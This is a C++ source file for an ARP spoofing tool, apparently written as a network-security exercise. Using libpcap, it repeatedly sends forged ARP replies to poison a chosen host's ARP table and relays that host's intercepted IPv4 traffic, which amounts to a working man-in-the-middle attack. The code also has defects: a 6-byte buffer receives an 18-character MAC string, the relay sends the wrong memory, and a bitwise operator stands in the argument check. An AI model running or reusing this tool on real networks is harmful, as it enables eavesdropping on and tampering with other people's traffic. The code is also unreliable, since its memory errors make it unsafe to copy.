#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
// newly added
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <pthread.h>

char* my_MAC;
char* my_IP;

struct thread_args {
	char* dev_;
	char* sip_;
	char* tip_;
};

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)


void usage() {
	printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

/* ==================================================
 *	disclaimer:
 *	get_IP_addr() and get_MAC_addr() are not my code
 */
char* get_my_IP(char *interface);
char* get_my_MAC(char *interface);
// ==================================================

void send_ARP(pcap_t* handle, uint16_t op, const char* sender_ip, const char* sender_mac, const char* target_ip, Mac target_mac, Mac d_mac);
Mac get_MAC_from_IP(pcap_t* handle, char* ip);

void *arp_spoof(void *arguments) {
	thread_args* args = (thread_args*) arguments;
	printf("Thread created for:\n");
	printf("\t%s, %s -> %s\n",args->dev_, args->sip_, args->tip_);
	
	char* dev = args->dev_;
	char* sender_ip = args->sip_;
	char* target_ip = args->tip_;

	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		exit(-1);
	}

	Mac sender_mac = get_MAC_from_IP(handle, sender_ip);
	Mac target_mac = get_MAC_from_IP(handle, target_ip);

	pcap_pkthdr* header;
	const u_char* packet;
	int res;

	for (int tick = 0; true; tick++) {
		if (tick % 10 == 0) {
			// periodically poison sender's ARP table
			send_ARP(handle, ArpHdr::Reply, target_ip, my_MAC, sender_ip, sender_mac, sender_mac);
										// [sender_ip, sender_mac, target_ip, target_mac, d_mac]
			printf("sender ARP table poisoning packet sent!\n");
		}

		res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			exit(-1);
		}

		// parse rcved packet
		EthHdr* eth_hdr = (EthHdr*) packet;

		// relay
		if (ntohs(eth_hdr->type_) == EthHdr::Ip4					// IPv4?
				&& eth_hdr->smac_ == Mac(sender_mac)				// from sender?
					&& eth_hdr->dmac_ == Mac(my_MAC)) {				// to me?
			eth_hdr->dmac_ = Mac(target_mac);

			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), header->len);
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
			printf("relay packet sent!\n");
		}
	}

	pcap_close(handle);
	pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
	if (argc < 4 | (argc-2)%2 != 0 ) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	my_MAC = get_my_MAC(dev);
	my_IP = get_my_IP(dev);

	int cnt = (argc-2) / 2;
	pthread_t threads[cnt];
	thread_args t_args[cnt];

	for (int t = 0; t < cnt; t++) {
		t_args[t].dev_ = dev;
		t_args[t].sip_ = argv[t*2 + 2];
		t_args[t].tip_ = argv[t*2 + 3];
		pthread_create(&threads[t], NULL, arp_spoof, &t_args[t]);
	}


	for (int t = 0; t < cnt; t++) {
		pthread_join(threads[t], NULL);
	}

	return 0;
}

Mac get_MAC_from_IP(pcap_t* handle, char* ip) {
	send_ARP(handle, ArpHdr::Request, my_IP,  my_MAC, ip, Mac("00:00:00:00:00:00"), Mac("ff:ff:ff:ff:ff:ff"));
	
	Mac mac;
	pcap_pkthdr* header;
	const u_char* packet;
	int res;

	while (true) {
		res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			exit(-1);
		}

		// parse rcved packet
		EthHdr* eth_hdr = (EthHdr*) packet;
		
		// only on desired ARP reply
		if (eth_hdr->type() == EthHdr::Arp) {
			ArpHdr* arp_hdr = (ArpHdr*) (packet + sizeof(EthHdr));
			if (arp_hdr->op() == ArpHdr::Reply
				&& arp_hdr->sip() == Ip(ip) && arp_hdr->tip() == Ip(my_IP)) {
				
				mac = eth_hdr->smac();
				break;
			}
		}
	}
	return mac;
}

void send_ARP(pcap_t* handle, uint16_t op, const char* sender_ip, const char* sender_mac, const char* target_ip, Mac target_mac, Mac d_mac) {
	EthArpPacket packet;

	packet.eth_.dmac_ = d_mac;
	packet.eth_.smac_ = Mac(sender_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(op);
	packet.arp_.smac_ = Mac(sender_mac);
	packet.arp_.sip_ = htonl(Ip(sender_ip));
	packet.arp_.tmac_ = target_mac;
	packet.arp_.tip_ = htonl(Ip(target_ip));

	// send ARP req pkt
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

char* get_my_IP(char *interface){
    struct ifreq ifr;
    char *ip = (char*)malloc(sizeof(char)*40);
    int s;

	s = socket(AF_INET, SOCK_DGRAM, 0); 
	strncpy(ifr.ifr_name, interface, IFNAMSIZ); 
	
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) { 
		printf("Interface Error"); 
        exit(-1);
	}

    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ip, sizeof(struct sockaddr)); 

    close(s);

    return ip;
}

char* get_my_MAC(char *interface){
	struct ifreq ifr;
	int s; 
    unsigned char *temp;
	char *hwaddr = (char *)malloc(sizeof(char)*6);

	s = socket(AF_INET, SOCK_DGRAM, 0); 
	strncpy(ifr.ifr_name, interface, IFNAMSIZ); 

	if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) { 
		printf("Interface Error"); 
        exit(-1);
	}
    
    temp = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    sprintf(hwaddr, "%2.2X:%2.2X:%2.2X:%2.2X:%2.2X:%2.2X\n",temp[0],temp[1],temp[2],temp[3],temp[4],temp[5]);

    close(s);
    return hwaddr;
}